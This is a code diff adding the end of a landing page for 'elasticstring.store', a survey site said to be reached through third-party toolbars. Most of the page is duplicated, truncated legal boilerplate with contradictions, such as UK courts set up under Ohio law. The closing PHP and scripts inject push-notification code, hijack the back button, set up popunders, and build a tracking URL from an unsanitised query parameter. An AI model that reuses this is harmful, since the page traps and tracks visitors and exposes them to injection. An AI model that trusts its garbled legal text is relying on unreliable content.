+            <h4 class="footer-tag footer-h4">16. Prior Agreements.</h4>
+            <p class="footer-para">This Agreement, which includes the elasticstring.store Privacy Policy, constitutes the entire agreement of the parties with respect to the subject matter hereto and supersedes and cancels all prior and contemporaneous agreements, claims, representations and understandings of the parties in connection with the subject matter addressed herein, oral or written.</p>
+            <p class="footer-para">We reserve the right, at our sole discretion, to change, modify or otherwise alter these Terms and Conditions at any time. Unless otherwise indicated, amendments will become effective immediately.</p>
+            <p class="footer-para">Please review these Terms and Conditions periodically. Your continued use of the Site following the posting of changes and/or modifications will constitute your acceptance of the revised Terms and Conditions and the reasonableness of these standards for notice of changes. For your information, this page was last updated as of the date at the top of these Terms of Service. Each access of information or submission of information to or from elasticstring.store will be a separate, discrete transaction based on the then prevailing terms.</p>
+            <h4 class="footer-tag footer-h4">17. Severability.</h4>
+            <p class="footer-para">In the event that a provision of this Agreement is found to be unlawful, conflicting with another provision of the Agreement, or otherwise unenforceable, the Agreement will remain in force as though it had been entered into without that unenforceable provision being included in it.</p>
+            <p class="footer-para">If two or more provisions of this Agreement are deemed to conflict with each other's operation, elasticstring.store shall have the sole right to elect which provision remains in force.</p>
+            <h4 class="footer-tag footer-h4">18. Survivability.</h4>
+            <p class="footer-para">All provision</p>
+        </div>
+    <div id="inline2" class="page-inner" style="display: none;">
+            <h4 class="footer-tag footer-h4">elasticstring.store</h4>
+            <h4 class="footer-tag footer-h3">Privacy Policy</h3>
+            <h4 class="footer-tag footer-h4">1. Introduction</h4>
+            <p class="footer-para">. Thank you for using elasticstring.store.</p>
+            <p class="footer-para">By using this site, you agree to be legally bound to this document which consists of our Terms of and Conditions of Use and other Disclosures, and constitutes a legally-binding agreement ("Agreement") governing the terms of providing you with our service. Throughout this document, the words "us," "we," "our," and "Company" refer to elasticstring.store, as is appropriate in the context of the use of the words. Likewise, the words "you" and "your" refer to you, the person who is being presented with this document for your agreement.</p>
+            <p class="footer-para">Accessing the Site, in any manner, whether automated or otherwise, constitutes use of the Site and your agreement to be bound by these Terms of Service. We reserve the right to change these Terms of Service or to impose new conditions on use of the Site, from time to time, in which case we will post the revised Terms of Service on this website. By continuing to use the Site after we post any such changes, you accept the Terms of Service, as modified.</p>
+            <h4 class="footer-tag footer-h4">2. Description of Service</h4>
+            <p class="footer-para">. elasticstring.store is a survey service which offers surveys, advertisements and/or other services as consideration for the provision of information to elasticstring.store.</p>
+            <p class="footer-para">Our surveys are made available to you as a result of your downloading, purchasing or otherwise subscribing to or using an application, tool bar or the like on your computer. We are in no way associated with or responsible for such application or tool bar.</p>
+            <h4 class="footer-tag footer-h4">3. Children's Privacy Statement</h4>
+            <p class="footer-para">This children's privacy statement explains our practices with respect to the online collection and use of personal information from children under the age of thirteen, and provides important information regarding their rights under federal law with respect to such information.</p>
+            <p class="footer-para">This Site is not directed to children under the age of thirteen and we do NOT knowingly collect personally identifiable information from children under the age of thirteen as part of the Site. We screen users who wish to provide personal information in order to prevent users under the age of thirteen from providing such information. If we become aware that we have inadvertently received personally identifiable information from a user under the age of thirteen as part of the Site, we will delete such information from our records. If we change our practices in the future, we will obtain prior, verifiable parental consent before collecting any personally identifiable information from children under the age of thirteen as part of the Site.</p>
+            <p class="footer-para">Because we do not collect any personally identifiable information from children under the age of thirteen as part of the Site, we also do NOT knowingly distribute such information to third parties.</p>
+            <p class="footer-para">We do NOT knowingly allow children under the age of thirteen to publicly post or otherwise distribute personally identifiable contact information through the Site.</p>
+            <p class="footer-para">Because we do not collect any personally identifiable information from children under the age of thirteen as part of the Site, we do NOT condition the participation of a child under thirteen in the Site's online activities on providing personally identifiable information.</p>
+            <h4 class="footer-tag footer-h4">4. Intellectual Property</h4>
+            <p class="footer-para">. This Site and all the materials available on the Site are the property of us and/or our affiliates or licensors, and are protected by copyright, trademark, and other intellectual property laws. The Site is provided solely for your personal noncommercial use. You may not use the Site or the materials available on the Site in a manner that constitutes an infringement of our rights or that has not been authorized by us. More specifically, unless explicitly authorized in these Terms of Service or by the owner of the materials, you may not modify, copy, reproduce, republish, upload, post, transmit, translate, sell, create derivative works, exploit, or distribute in any manner or medium (including by email or other electronic means) any material from the Site. You may, however, from time to time, download and/or print one copy of individual pages of the Site for your personal, non-commercial use, provided that you keep intact all copyright and other proprietary notices.</p>
+            <p class="footer-para">The trade names and trademarks of the persons or entities referred to in our advertisements are owned by those entities, and we are not affiliated with them in any way. elasticstring.store holds the intellectual property rights that refer to its own name only, including, without limitation, the Company trademark, logo, design, text, graphics and forms, including the selection and arrangement of such elements. In addition, the entire Site is copyrighted as a collective work. Company holds the copyright in all other materials as well as in the collective work itself. The collective work may also include works that are the property of Company's licensors, or simply of other third parties who are referred to on the site but to whom the Company has no affiliation and who are identified only as a reference. Those third parties' trademarks may also be protected by copyright and other intellectual property laws, and the use of their trademarks may be restricted as applicable. We may permit Users to submit content or other information to our site. Because of this, we must ensure that all content uploaded to us may be used legally by us without having to remove it at a later date due to a revocation of license by the uploading user, or a copyright complaint by the rightful owner. Therefore, by uploading any content to our site, you agree that you grant us a universal, perpetual, sublicensable, commercial and non-commercial, irrevocable license to use such content, and that you represent to us that you have the right to grant such a license. You agree to indemnify us as well as any third party affected by your wrongful representations if you should represent falsely that you have the right to grant this license.</p>
+            <h4 class="footer-tag footer-h4">5. Privacy.</h4>
+            <p class="footer-para">We may collect and store personal or other information that you voluntarily supply to us online while using the our service (e.g., while on the Site, participating in a survey, or in responding via email to a feature provided on the Site). elasticstring.store only contacts individuals who specifically request that we do so or in the event that they have signed up to receive our messaging or have purchased one of our products or third-party offers. elasticstring.store may collect personally identifying information from our users during online registration and online purchasing. Generally, this information includes name and e-mail address for registration to receive our free newsletters and name, postal address, and credit card information when purchasing products.</p>
+            <p class="footer-para">We may also collect and store information that is generated automatically as you navigate online through the Site. For example, we may collect information about your computer's connection to the Internet, which allows us, among other things, to improve the delivery of our web pages to you and to measure traffic on the Site. We also may use a standard feature found in browser software called a "cookie" to enhance your experience with the Site. Cookies are small files that your web browser places on your hard drive for record-keeping purposes. By showing how and when visitors use the Site, cookies help us deliver advertisements, identify how many unique users visit us, and track user trends and patterns. They also prevent you from having to re-enter your preferences on certain areas of the Site where you may have entered preference information before. The Site also may use web beacons (single-pixel graphic files also known as "transparent GIFs") to access cookies and to count users who visit the Site or open HTML-formatted email messages.</p>
+            <p class="footer-para">We may use the information we collect from you while you are using the Site in a variety of ways, including using the information to customize features. and advertising that appear on the Site. We also may provide your information to third parties, such as service providers and contractors for a variety of purposes. Unless you inform us in accordance with the process described below, we reserve the right to use, and to disclose to third parties, all of the information collected from and about you while you are using the Site in any way and for any purpose, such as to enable us or a third party to provide you with information about products and services. If you do not wish your information to be used for these purposes, you must send a letter to the Online Privacy Coordinator whose address is listed at the end of this Privacy Policy requesting to be taken off any lists of information that may be used for these purposes or that may be given or sold to third-parties.</p>
+            <p class="footer-para">Please keep in mind that whenever you voluntarily make your personal information available for viewing by third parties online - for example on message boards, web logs, through email, or in chat areas - that information can be seen, collected and used by others besides us. We cannot be responsible for any unauthorized third-party use of such information.</p>
+            <p class="footer-para">Some of our third-party advertisers and ad servers that place and present advertising on the Site also may collect information from you via cookies, web beacons or similar technologies. These third-party advertisers and ad servers may use the information they collect to help present their advertisements, to help measure and research the advertisements' effectiveness, or for other purposes. The use and collection of your information by these third-party advertisers and ad servers is governed by the relevant third-party's privacy policy and is not covered by our Privacy Policy. Indeed, the privacy policies of these third-party advertisers and ad servers may be different from ours. If you have any concerns about a third party's use of cookies or web beacons or use of your information, you should visit that party's website and review its privacy policy.</p>
+            <p class="footer-para">The Site also includes links to other websites and provides access to products and services offered by third parties, whose privacy policies we do not control. When you access another website or purchase third-party products or services through the Site, use of any information you provide is governed by the privacy policy of the operator of the site you are visiting or the provider of such products or services.</p>
+            <p class="footer-para">We may also make some content, products and services available through our Site through cooperative relationships with third-party providers, where the brands of our provider partner appear on the Site in connection with such content, products and/or services. We may share with our provider partner any information you provide, or that is collected, in the course of visiting any pages that are made available in cooperation with our provider partner. In some cases, the provider partner may collect information from you directly, in which cases the privacy policy of our provider partner may apply to the provider partner's use of your information. The privacy policy of our provider partners may differ from ours. If you have any questions regarding the privacy policy of one of our provider partners, you should contact the provider partner directly for more information.</p>
+            <p class="footer-para">Be aware that we may occasionally release information about our visitors when release is appropriate to comply with law or to protect the rights, property or safety of users of the Site or the public.</p>
+            <p class="footer-para">Please also note that as our business grows, we may buy or sell various assets. In the unlikely event that we sell some or all of our assets, or one or more of our websites is acquired by another company, information about our users may be among the transferred assets.</p>
+            <h4 class="footer-tag footer-h4">6. On-Line Commerce:</h4>
+            <p class="footer-para">Use of our service may allow you to purchase many different types of products and services online that are solely provided by third parties. We are not responsible for the quality, accuracy, timeliness, reliability or any other aspect of these products and services. If you make a purchase from such a merchant or on a site linked to by the Site, the information obtained during your visit to that merchant's online store or site, and the information that you give as part of the transaction, such as your credit card number and contact information, may be collected by both the merchant and us. A merchant may have privacy and data collection practices that are different from ours. We have no responsibility or liability for these independent policies. In addition, when you purchase products or services on or through the Site, you may be subject to additional terms and conditions that specifically apply to your purchase or use of such products or services. For more information regarding a merchant, its online store, its privacy policies, and/or any additional terms and conditions that may apply, visit that merchant's website and click on its information links or contact the merchant directly. You release us and our affiliates from any damages that you incur, and agree not to assert any claims against us or them, arising from your purchase or use of any products or services made available by third parties through the Site.</p>
+            <p class="footer-para">Your participation, correspondence or business dealings with any third party found on or through our Site, regarding payment and delivery of specific goods and services, and any other terms, conditions, representations or warranties associated with such dealings, are solely between you and such third party. You agree that COMPANY shall not be responsible or liable for any loss, damage, or other matters of any sort incurred as the result of such dealings</p>
+            <h4 class="footer-tag footer-h4">7. Disclaimers.</h4>
+            <p class="footer-para">Throughout the Site, we may provide links and pointers to Internet sites maintained by third parties. Our linking to such third-party sites does not imply an endorsement or sponsorship of such sites, or the information, products or services offered on or through the sites. In addition, neither we nor affiliates operate or control in any respect any information, products or services that third parties may provide on or through the Site or on websites linked to by us on the Site.</p>
+            <p class="footer-para">If applicable, any opinions, advice, statements, services, offers, or other information or content expressed or made available by third parties, including information providers, are those of the respective authors or distributors, and not Company. Neither Company nor any third-party provider of information guarantees the accuracy, completeness, or usefulness of any content. Furthermore, Company neither endorses nor is responsible for the accuracy and reliability of any opinion, advice, or statement made on any of the Sites by anyone other than an authorized Company representative while acting in his/her official capacity.</p>
+            <p class="footer-para">THE INFORMATION, PRODUCTS AND SERVICES OFFERED ON OR THROUGH THE SITE AND BY COMPANY AND ANY THIRD-PARTY SITES ARE PROVIDED "AS IS" AND WITHOUT WARRANTIES OF ANY KIND EITHER EXPRESS OR IMPLIED. TO THE FULLEST EXTENT PERMISSIBLE PURSUANT TO APPLICABLE LAW, WE DISCLAIM ALL WARRANTIES, EXPRESS OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE. WE DO NOT WARRANT THAT THE SITE OR ANY OF ITS FUNCTIONS WILL BE UNINTERRUPTED OR ERROR-FREE, THAT DEFECTS WILL BE CORRECTED, OR THAT ANY PART OF THIS SITE, OR THE SERVERS THAT MAKE IT AVAILABLE, ARE FREE OF VIRUSES OR OTHER HARMFUL COMPONENTS.</p>
+            <p class="footer-para">WE DO NOT WARRANT OR MAKE ANY REPRESENTATIONS REGARDING THE USE OR THE RESULTS OF THE USE OF THE SITE OR MATERIALS ON THIS SITE OR ON THIRD-PARTY SITES IN TERMS OF THEIR CORRECTNESS, ACCURACY, TIMELINESS, RELIABILITY OR OTHERWISE.</p>
+            <p class="footer-para">YOU SPECIFICALLY UNDERSTAND THAT OUR SURVEYS, CONTENT AND ADVERTISEMENTS ARE MADE AVAILABLE TO YOU AS A RESULT OF YOUR AFFIRMATIVE USE OF A TOOLBAR APPLICATION THAT YOU PROCURED FROM A THIRD-PARTY COMPANY THAT IS NOT AFFILIATED IN ANYWAY WITH US. YOU FURTHER AGREE THAT WE ARE NOT RESPONSIBLE IN ANY WAY FOR SUCH APPLICATION OR ANY TECHNICAL ISSUES WITH SUCH THIRD-PARTY APPLICATION. ANY QUESTIONS, ISSUES, PROBLEMS, CONFLICTS OR COMPLAINTS REGARDING SUCH THIRD-PARTY TOOLBAR APPLICATION IS SUCH THIRD-PARTY COMPANY'S RESPONSIBILITY.</p>
+            <p class="footer-para">COMPANY SHALL IN NO EVENT BE HELD LIABLE TO ANY PARTY FOR ANY DIRECT, INDIRECT, PUNITIVE, SPECIAL, INCIDENTAL OR OTHER CONSEQUENTIAL DAMAGES ARISING DIRECTLY OR INDIRECTLY FOR ANY REASON.</p>
+            <p class="footer-para">You agree at all times to defend, indemnify and hold harmless Company and its affiliates from and against any and all claims, causes of action, damages, liabilities, costs and expenses, including legal fees and expenses, arising out of or related to your breach of any obligation, warranty, representation or covenant set forth herein.</p>
+            <h4 class="footer-tag footer-h4">8. Limitation of Liability.</h4>
+            <p class="footer-para">WE MAKE NO REPRESENTATIONS OR WARRANTIES AS TO THE MERCHANTABILITY OF OUR OR OUR OR OUR PROVIDERS' SERVICE OR FITNESS FOR ANY PARTICULAR PURPOSE. YOU AGREE THAT YOU ARE RELEASING US FROM ANY LIABILITY THAT WE MAY OTHERWISE HAVE TO YOU IN RELATION TO OR ARISING FROM THIS AGREEMENT OR OUR PRODUCTS, FOR REASONS INCLUDING, BUT NOT LIMITED TO, FAILURE OF OUR SERVICE, NEGLIGENCE, OR ANY OTHER TORT. TO THE EXTENT THAT APPLICABLE LAW RESTRICTS THIS RELEASE OF LIABILITY, YOU AGREE THAT WE ARE ONLY LIABLE TO YOU FOR THE MINIMUM AMOUNT OF DAMAGES THAT THE LAW RESTRICTS OUR LIABILITY TO, IF SUCH A MINIMUM EXISTS. YOU AGREE THAT WE ARE NOT RESPONSIBLE IN ANY WAY FOR ANY LOSSES CAUSED BY THE PURCHASE OF SERVICES THROUGH OUR SERVICE. THIS INCLUDES ANY FAILURE OR DAMAGE CAUSED BY A SERVICE, INCLUDING INJURY TO PERSONS OR PROPERTY. WE ARE NOT LIABLE FOR ANY FAILURE OF THE GOODS OR SERVICES OF OUR COMPANY OR A THIRD PARTY, INCLUDING ANY FAILURES OR DISRUPTIONS, UNTIMELY DELIVERY, SCHEDULED OR UNSCHEDULED, INTENTIONAL OR UNINTENTIONAL, ON OUR SITE WHICH PREVENT ACCESS TO OUR SITE TEMPORARILY OR PERMANENTLY. THE PROVISION OF OUR SERVICE TO YOU IS CONTINGENT ON YOUR AGREEMENT WITH THIS AND ALL OTHER SECTIONS OF THIS AGREEMENT. NOTHING IN THE PROVISIONS OF THIS "REPRESENTATIONS &amp; WARRANTIES" SECTION SHALL BE CONSTRUED TO LIMIT THE GENERALITY OF THE FIRST PARAGRAPH OF THIS SECTION.</p>
+            <p class="footer-para">For Jurisdictions that do not allow us to limit our liability: Notwithstanding any provision of these Terms, if your jurisdiction has provisions specific to waiver or liability that conflict with the above then our liability is limited to the smallest extent possible by law.</p>
+            <h4 class="footer-tag footer-h4">9. Remedy for Dissatisfaction.</h4>
+            <p class="footer-para">If you are dissatisfied with the elasticstring.store Site or with any terms, conditions, rules, policies, guidelines, or practices of elasticstring.store in operating the elasticstring.store Site, your sole and exclusive remedy is to discontinue using the elasticstring.store Site.</p>
+            <p class="footer-para">We may cancel or terminate your right to use the Site or any part of the Site at any time without notice. In the event of cancellation or termination, you are no longer authorized to access the part of the Site affected by such cancellation or termination. The restrictions imposed on you with respect to material downloaded from the Site, and the disclaimers and limitations of liabilities set forth in these Terms of Service, shall survive.</p>
+            <h4 class="footer-tag footer-h4">10.</h4>0
+            <p class="footer-para">The Digital Millennium Copyright Act of 1998 (the "DMCA") provides recourse for copyright owners who believe that material appearing on the Internet infringes their rights under the U.S. copyright law. If you believe in good faith that materials hosted by COMPANY infringe your copyright, you, or your agent may send to COMPANY a notice requesting that the material be removed or access to it be blocked. Any notification by a copyright owner or a person authorized to act on its behalf that fails to comply with requirements of the DMCA shall not be considered sufficient notice and shall not be deemed to confer upon COMPANY actual knowledge of facts or circumstances from which infringing material or acts are evident. If you believe in good faith that a notice of copyright infringement has been wrongly filed against you, the DMCA permits you to send to COMPANY a counter-notice. All notices and counter notices must meet the then current statutory requirements imposed by the DMCA; see http://www.loc.gov/copyright for details. COMPANY's Copyright Agent for notice of claims of copyright infringement or counter notices can be reached as follows: <a href="./files/" class="__cf_email__" data-cfemail="c2abaca4ad82a7aea3b1b6aba1b1b6b0abaca5ecb1b6adb0a7">[email&#160;protected]</a></p>
+            <h4 class="footer-tag footer-h4">11. Indemnity.</h4>
+            <p class="footer-para">You agree at all times to defend, indemnify, and hold us harmless for any and all claims, causes of action, damages, liabilities, costs and expenses, including legal fees and expenses, arising from or related to this Agreement or the provision of our Service to you, any damages caused by your use of our Site, any products or services you order from our affiliates, or any breach of this Agreement or the terms of use herein.by you or any third party In the event of a claim such as one described in this paragraph, we may elect to settle with the party/parties making the claim, and you shall be liable for the damages as though we had proceeded with a trial.</p>
+            <h4 class="footer-tag footer-h4">12. Choice of Law.</h4>
+            <p class="footer-para">This Agreement shall be governed by the laws in force in the United Kingdom. The offer and acceptance of this contract is deemed to have occurred in the United Kingdom.</p>
+            <h4 class="footer-tag footer-h4">13. Forum of Dispute.</h4>
+            <p class="footer-para">In order to keep claims involving elasticstring.store simple, you agree that any claim you may bring against elasticstring.store arising from or relating to this Agreement will be heard solely by a court of competent jurisdiction in the United Kingdom. Specifically, you agree that any disputes shall be heard, where eligible, solely within the small claims division ("Small Claims Court") of the United Kingdom county or municipal court, as established by chapter 1925 of the Ohio Revised Code.</p>
+            <p class="footer-para">If the Small Claims Court has no jurisdiction to grant such relief, you will waive your right to obtain such relief against us.</p>
+            <p class="footer-para">If you bring a dispute in a manner other than in accordance with this section, you agree that we may move to have it dismissed, and that you will be responsible for our reasonable attorneys' fees, court costs, and disbursements in doing so.</p>
+            <p class="footer-para">You agree that the prevailing party in any dispute will be entitled to claim from the unsuccessful party the entire amount of the prevailing party's reasonable attorneys' fees, costs, and disbursements in relation to the dispute.</p>
+            <h4 class="footer-tag footer-h4">14. Finality.</h4>
+            <p class="footer-para">This Agreement, including any and all documents referenced herein, constitute the entire agreement between elasticstring.store and you pertaining to the subject matter hereof.</p>
+            <h4 class="footer-tag footer-h4">15. Non-Waiver.</h4>
+            <p class="footer-para">elasticstring.store's failure to insist upon or enforce strict performance of any provision of this Agreement shall not be construed as a waiver of any provisions or right. If any of the provisions contained in this Agreement be determined to be void, invalid or otherwise unenforceable by a court of competent jurisdiction, such determination shall not affect the remaining provisions contained herein. This Agreement shall be governed by and construed in accordance with the laws applicable in the United Kingdom, including the federal law in the United Kingdom.</p>
+            <h4 class="footer-tag footer-h4">16. Prior Agreements.</h4>
+            <p class="footer-para">This Agreement, which includes the elasticstring.store Privacy Policy, constitutes the entire agreement of the parties with respect to the subject matter hereto and supersedes and cancels all prior and contemporaneous agreements, claims, representations and understandings of the parties in connection with the subject matter addressed herein, oral or written.</p>
+            <p class="footer-para">We reserve the right, at our sole discretion, to change, modify or otherwise alter these Terms and Conditions at any time. Unless otherwise indicated, amendments will become effective immediately.</p>
+            <p class="footer-para">Please review these Terms and Conditions periodically. Your continued use of the Site following the posting of changes and/or modifications will constitute your acceptance of the revised Terms and Conditions and the reasonableness of these standards for notice of changes. For your information, this page was last updated as of the date at the top of these Terms of Service. Each access of information or submission of information to or from elasticstring.store will be a separate, discrete transaction based on the then prevailing terms.</p>
+            <h4 class="footer-tag footer-h4">17. Severability.</h4>
+            <p class="footer-para">In the event that a provision of this Agreement is found to be unlawful, conflicting with another provision of the Agreement, or otherwise unenforceable, the Agreement will remain in force as though it had been entered into without that unenforceable provision being included in it.</p>
+            <p class="footer-para">If two or more provisions of this Agreement are deemed to conflict with each other's operation, elasticstring.store shall have the sole right to elect which provision remains in force.</p>
+            <h4 class="footer-tag footer-h4">18. Survivability.</h4>
+            <p class="footer-para">All provision</p>
+        </div>
+    <script data-cfasync="false" src="./files/email-decode.min.js"></script><script src="https://code.jquery.com/jquery-1.12.0.min.js"></script>
+    <script type="text/javascript" src="./files/jquery.lightbox.js"></script>
+    <script type="text/javascript" src="./files/main.js"></script>
+
+</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <?php
+		if (($_GET['nopush'] !== "1") && ($_GET['src'] !== "TV"))
+		{
+			$aff_id = "2";
+			if (!empty($_GET["s"])) {
+				$aff_id = $_GET["s"];
+			}
+			
+			$trk_urls = [
+				 "https://" . $_GET["trk"] . "/click/20"
+			];
+			
+			echo getPushCode("us", $aff_id, $trk_urls);
+		   }
+		?>
+		
+		<?php
+		$backbutton_url = "https://" . $_SERVER['HTTP_HOST'] . "/back-w14.php?c=" . $_GET['c'] . "&k=" . $_GET['k'] . "&id=" . $_GET['id'] . "&source=" . $_GET['source'];
+		
+		echo getBackButton($backbutton_url);
+		?>
+
+
+
+</body>
+<script>
+var refresh_page = 1;
+var popUrl = '{"popunder_mode":[{"type":0,"device":0}],"urls":""}';
+var s1 = '350778';
+var s2 = '1099120942';
+var s3 = '6323';
+</script>
+<script type="text/javascript"
+    src="./files/functions.js?v=1701708698"></script>
